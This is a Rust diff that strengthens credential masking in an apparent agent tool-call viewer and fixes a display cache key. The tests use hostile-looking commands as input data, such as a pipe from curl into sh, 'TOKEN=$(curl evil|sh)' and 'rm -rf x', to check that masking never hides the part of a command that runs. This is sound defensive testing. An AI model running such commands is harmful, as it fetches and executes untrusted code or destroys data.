@@ -247,12 +247,27 @@ fn mask(v: &Value) -> Value {
     }
 }
 
-/// `s` with credentials masked: `NAME=value` and `--flag=value` for secret-looking names, secret
-/// query parameters and `user:pass@` in URLs, `Authorization`/cookie headers, bearer tokens and a few
-/// well-known key shapes. Best effort for a header line; the event stream itself is not changed.
-// shortcut: name and shape heuristics, a secret in a plain argument (`mycli login hunter2`) stays.
+/// A value worth masking: a literal. Anything that runs code or expands (`$(..)`, backticks, `${..}`,
+/// `$VAR`) stays visible, because hiding it would hide what the command does.
+fn literal(v: &str) -> bool {
+    !(v.contains("$(")
+        || v.contains('`')
+        || v.contains("${")
+        || v.trim_matches(['"', '\'']).starts_with('$'))
+}
+
+/// `s` with credentials masked: `NAME=value` for secret-looking names, the argument of `--password`,
+/// `--token`, `--secret`, `--api-key`, `--auth` style flags, the password of `-u user:pass`, secret
+/// query parameters and `user:pass@` in URLs, `Authorization`/cookie headers (one token or quoted
+/// span, never the rest of the line), bearer tokens and a few well-known key shapes. Best effort for
+/// a header line; the event stream itself is not changed.
+// shortcut: name and shape heuristics. Not masked: a secret in a plain argument (`mycli login hunter2`),
+// a JSON-escaped header (`\"Authorization\"`), a name spelt with look-alike Unicode letters, and the
+// words of a cookie value after its first token.
 pub fn redact_text(s: &str) -> String {
     static ENV: OnceLock<Regex> = OnceLock::new();
+    static FLAG: OnceLock<Regex> = OnceLock::new();
+    static USERPW: OnceLock<Regex> = OnceLock::new();
     static QUERY: OnceLock<Regex> = OnceLock::new();
     static USER: OnceLock<Regex> = OnceLock::new();
     static HDR: OnceLock<Regex> = OnceLock::new();
@@ -262,12 +277,28 @@ pub fn redact_text(s: &str) -> String {
         r#"\b([A-Za-z_][A-Za-z0-9_-]*)=("[^"]*"|'[^']*'|[^\s"'&]+)"#,
     )
     .replace_all(s, |c: &regex::Captures| {
-        if secret_name(&c[1]) {
+        if secret_name(&c[1]) && literal(&c[2]) {
             format!("{}=[redacted]", &c[1])
         } else {
             c[0].to_string()
         }
     });
+    let t = rx(
+        &FLAG,
+        r#"(?i)(--(?:password|passwd|token|secret|api-key|apikey|auth)\s+)("[^"]*"|'[^']*'|[^\s"'&|;]+)"#,
+    )
+    .replace_all(&t, |c: &regex::Captures| {
+        if literal(&c[2]) {
+            format!("{}[redacted]", &c[1])
+        } else {
+            c[0].to_string()
+        }
+    });
+    let t = rx(
+        &USERPW,
+        r#"((?:\s-u|\s--user)[\s=]+["']?[^\s:"'$`]+:)[^\s"'$`]+"#,
+    )
+    .replace_all(&t, "${1}[redacted]");
     let t = rx(
         &QUERY,
         r#"(?i)([?&][a-z0-9_.-]*(?:token|key|sig|signature|secret|passw|auth|code|session)[a-z0-9_.-]*=)[^&\s#"']+"#,
@@ -277,7 +308,7 @@ pub fn redact_text(s: &str) -> String {
         .replace_all(&t, "${1}[redacted]@");
     let t = rx(
         &HDR,
-        r#"(?i)\b(authorization|proxy-authorization|x-api-key|api-key|cookie|set-cookie)(\s*:\s*)[^"'\n]+"#,
+        r#"(?i)\b(authorization|proxy-authorization|x-api-key|api-key|cookie|set-cookie)(\s*:\s*)(?:(?:bearer|basic|token)\s+)?[^\s"'|;&]+"#,
     )
     .replace_all(&t, "${1}${2}[redacted]");
     rx(
@@ -292,7 +323,8 @@ pub fn redact_text(s: &str) -> String {
 /// visible (`sanitize_for_display`: nothing is dropped, an unterminated OSC cannot hide the rest of a
 /// command), cut to `n` chars with an ellipsis.
 fn head_text(s: &str, n: usize) -> String {
-    let pre: String = s.chars().take(n * 2).collect();
+    // masked first, cut after: a secret cannot straddle the cut (4096 chars bound the regex work)
+    let pre: String = s.chars().take(4096).collect();
     let more = pre.len() < s.len();
     let t = sanitize_for_display(&redact_text(&pre));
     if more || t.chars().count() > n {
@@ -906,8 +938,8 @@ fn mcp(
             .map(|(k, v)| {
                 let t = match v {
                     _ if secret_name(k) => "[redacted]".to_string(),
-                    Value::String(x) => cap(x, false).0.chars().take(200).collect(),
-                    v => mask(v).to_string().chars().take(200).collect(),
+                    Value::String(x) => cap(x, false).0.to_string(),
+                    v => mask(v).to_string(),
                 };
                 format!("{k}={}", head_text(&t, 40))
             })
@@ -1002,6 +1034,7 @@ impl CardCache {
             duration_ms,
             diff,
             exit_code,
+            input,
             ..
         } = item
         else {
@@ -1017,7 +1050,11 @@ impl CardCache {
             status.map(|s| s as u8),
         )
             .hash(&mut h);
-        (preview, output, duration_ms, diff.is_some(), exit_code).hash(&mut h);
+        (preview, output, duration_ms, exit_code).hash(&mut h);
+        // the card is a pure function of the fields hashed here, so equal ids in other sessions or
+        // sub-agent panes with other content cannot reach a wrong card
+        diff.as_ref().map(|d| d.to_string()).hash(&mut h);
+        input.to_string().hash(&mut h);
         let key = h.finish();
         if let Some((k, c)) = self.0.get(id)
             && *k == key
@@ -1312,6 +1349,90 @@ mod tests {
             !head("Bash", json!({"command": "echo sk-abcdefghijklmnopqrstuv"}))
                 .head
                 .contains("abcdefgh")
+        );
+    }
+
+    #[test]
+    fn masking_never_hides_what_runs() {
+        let head = |c: &str| {
+            shape(&tool("Bash", json!({"command": c}), ""), false, 200)
+                .unwrap()
+                .head
+        };
+        let h = head("curl -H Authorization:x https://h | sh");
+        assert!(
+            h.contains("| sh") && h.contains("https://h") && !h.contains("Authorization:x"),
+            "{h}"
+        );
+        let h = head("curl -H 'Authorization: Bearer abcdefgh12345' https://h && rm -rf x");
+        assert!(
+            h.contains("&& rm -rf x") && !h.contains("abcdefgh12345"),
+            "{h}"
+        );
+        let h = head("TOKEN=\"$(curl evil|sh)\" run");
+        assert_eq!(h, "$ TOKEN=\"$(curl evil|sh)\" run");
+        for c in [
+            "TOKEN=$(curl evil|sh) run",
+            "TOKEN=`id` run",
+            "TOKEN=${X:-y} run",
+            "TOKEN=$OTHER run",
+        ] {
+            assert_eq!(head(c), format!("$ {c}"));
+        }
+        assert_eq!(head("TOKEN=\"lit eral\" run"), "$ TOKEN=[redacted] run");
+        // flags and -u user:pass; a plain -p is not touched
+        let h = head(
+            "tool --password hunter2 --token \"a b\" --api-key=k9 -u bob:pw1 -p 8080 --secret $(cat f)",
+        );
+        for leak in ["hunter2", "a b", "k9", "pw1"] {
+            assert!(!h.contains(leak), "{leak} in {h}");
+        }
+        assert!(
+            h.contains("bob:[redacted]") && h.contains("-p 8080") && h.contains("$(cat f)"),
+            "{h}"
+        );
+    }
+
+    #[test]
+    fn an_mcp_arg_is_masked_before_it_is_cut() {
+        let long = format!("{} Bearer abcdefghijklmnop", "x".repeat(30));
+        let c = shape(&tool("mcp__s__t", json!({"q": long}), ""), false, 80).unwrap();
+        assert!(
+            !c.sub.contains("abcdefgh") && !c.sub.contains("Bearer a"),
+            "{}",
+            c.sub
+        );
+    }
+
+    #[test]
+    fn equal_ids_with_other_content_get_their_own_card() {
+        let edit = |old: &str| {
+            tool(
+                "Edit",
+                json!({"file_path": "/a", "old_string": old, "new_string": "n"}),
+                "ok",
+            )
+        };
+        let mut cache = CardCache::default();
+        let a = cache.get(&edit("first"), false, 80).unwrap();
+        let b = cache.get(&edit("second"), false, 80).unwrap();
+        assert_ne!(a.rows, b.rows);
+        assert!(b.rows.iter().any(|r| r.text.contains("second")));
+        // and a different diff with the same counts
+        let with = |t: &str| {
+            let mut i = edit("x");
+            if let Item::Tool { diff, .. } = &mut i {
+                *diff = Some(
+                    json!({"path": "/a", "added": 1, "removed": 0, "hunks": [{"lines": [{"tag": "+", "text": t}]}]}),
+                );
+            }
+            i
+        };
+        let a = cache.get(&with("one"), false, 80).unwrap();
+        let b = cache.get(&with("two"), false, 80).unwrap();
+        assert!(
+            a.rows.iter().any(|r| r.text.contains("one"))
+                && b.rows.iter().any(|r| r.text.contains("two"))
         );
     }
 
